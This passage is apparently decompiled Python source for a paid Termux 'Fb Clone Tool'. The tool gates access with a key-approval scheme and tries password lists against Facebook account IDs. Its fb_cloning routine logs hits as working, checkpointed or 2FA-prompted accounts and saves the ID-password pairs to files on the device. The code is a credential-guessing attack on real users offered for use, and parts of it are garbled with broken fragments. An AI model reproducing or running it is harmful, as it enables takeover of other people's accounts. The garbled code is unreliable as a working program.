...
fb = 'devifyter'
wp = '+923263342276'
github = 'https://www.facebook.com/profile.php?id=61553924229187'
...
logo = f'''\n _____  ________      _______ \n \x1b[1;97m|  __ \|  ____\ \    / /_   _|\n \x1b[1;97m| |  | | |__   \ \  / /  | |  \n   \x1b[1;97m | |  | |  __|   \ \/ /   | |  \n    \x1b[1;97m| |__| | |____   \  /   _| |_ \n   \x1b[1;97m|_____/|______|   \/   |_____|\n{'--------------------------------------------------'}\n[+] Tool Version     :   2.0.0\n[+] Tool Author      :   Devi\n[+] Tool Type        :   Cloning Tool\n[+] Premium Member   :   Premium {rc}㊅{s}\n{'--------------------------------------------------'}\n{lg}MY KEY : {MY_KEY}{s}\n{'--------------------------------------------------'}\n[+] Date Format      :   {aajdate}\n[+] Update Format    :   {rg}2024-09-01{s}\n[+] Welcome          :   Fb Clone Tool\n{'--------------------------------------------------'}'''
        def Mano_menu():
            UMO = 'DEVI-'
            uuid = str(os.geteuid()) + str(os.getlogin())
            id = '5'.join(uuid)
            print(logo)
            DARK = requests.get('https://github.com/deathherev/Cloning-Fb/blob/main/approval.txt').text
            if id in DARK:
                login123()
                return None
            None.system('clear')
            os.system('xdg-open https://www.facebook.com/profile.php?id=61578248083866')
            time.sleep(3)
            os.system('clear')
            print(logo)
            print('\t\x1b[30m [\x1b[1;36m\x1b[40m First Get Approvel \x1b[01m\x1b[1;30m]')
            print('')
            print(' \x1b[1;34mYour Key : ' + UMO + id)
            print('')
            print('\x1b[1;32m')
            print('\x1b[1;95m Approval 7 Days Price Rs 600')
            print('\x1b[1;32m')
            print(' \x1b[1;95m Approval 15Days Price Rs 1200 ')
            print('\x1b[1;32m')
            print('\x1b[1;95mApproval 30 days Price Rs 2500')
            print('\x1b[1;32m')
            print(' \x1b[1;95mDaliy New Updates ')
            print('\x1b[1;32m')
            print(' \x1b[1;95m Important Note Payment Kam Nhi Ho Gaii Fixed Pirce hai Thanks You')
            print(' \x1b[1;95mFree User Texi Nhi Krya Thnks You')
            print('\x1b[1;32m')
            print('\x1b[1;95mSystem Fuck This Tool')
            print('\x1b[1;32m')
            print('')
            print('\x1b[1;33mYour Key : ' + UMO + id)
            print('\n')
            os.system
...
def caseher():
    ...
    print('[6] How To Run ADEVI Commond')
    print('[7] Exit Tool')
    print('--------------------------------------------------')
    ...
    if selectme in ('05', '5', 'five'):
        os.system('termux-open-url https://www.facebook.com/profile.php?id=61553924229187')
        caseher()
...
def fb_cloning():
    ...
    time.sleep(5)
    print('Devi tool you run premium now you run it')
    time.sleep(5)
    os.system('clear')
    print(logo)
    ...
    for pw in pwv:
        ...
        for roid in ro:
            ...
            if 'www.facebook.com' in r.text:
                print(f'''   \r {rp}[DEVI-CP] {idf} | {pw}{s}''')
                open('/sdcard/DEVI_cp.txt', 'a').write(roid + '|' + pw + '\n')
                akun.append(idf + '|' + pw)
                cp += 1
                'attempt_login'
        if 'session_key' in r.text:
            ok += 1
            print(f'''   \r {rg}[DEVI-OK] {roid} | {pw}{s}''')
            open('/sdcard/DEVI_ok.txt', 'a').write(roid + '|' + pw + '\n')
            '1'
        if 'SMS shortly' in r.text:
            print(f'''   \r {rc}[DEVI-2F] {idf} | {pw}{s}''')
            open('/sdcard/DEVI_2f.txt', 'a').write(roid + '|' + pw + '\n')
            'try_number'
        loop += 1
        return None
